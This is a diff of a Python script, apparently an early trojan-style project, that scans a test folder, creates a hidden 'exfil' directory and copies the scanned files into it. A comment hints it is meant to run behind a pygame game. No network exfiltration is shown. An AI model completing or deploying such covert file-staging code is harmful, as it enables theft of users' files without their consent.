@@ -3,13 +3,15 @@ import os
 import asyncio
 import ctypes
 
-# test dir
-directory = "C:/Users/jgwfl/OneDrive/Desktop/test_dir"
 
-#file paths
-files = []
 
-def iterate_files(directory):
+def iterate_files():
+
+    # test dir
+    directory = "C:/Users/jgwfl/OneDrive/Desktop/test_dir"
+
+    #file paths
+    files = []
 
     #scan dir for object
     for obj in os.scandir(directory):
@@ -20,7 +22,7 @@ def iterate_files(directory):
 
     exfil_dir = create_hidden_dir(directory)
     if exfil_dir:
-        copy_files(exfil_dir)
+        copy_files(exfil_dir, files)
     
     
 
@@ -46,7 +48,7 @@ def create_hidden_dir(directory):
     except Exception as e:
         print(f"Error, {e}")
     
-def copy_files(exfil):
+def copy_files(exfil, files):
     
     for file in files:
         fname = os.path.basename(file)
@@ -60,5 +62,4 @@ def copy_files(exfil):
             continue
 
 #add async when pygame is run after
-
-iterate_files(directory)
+iterate_files()
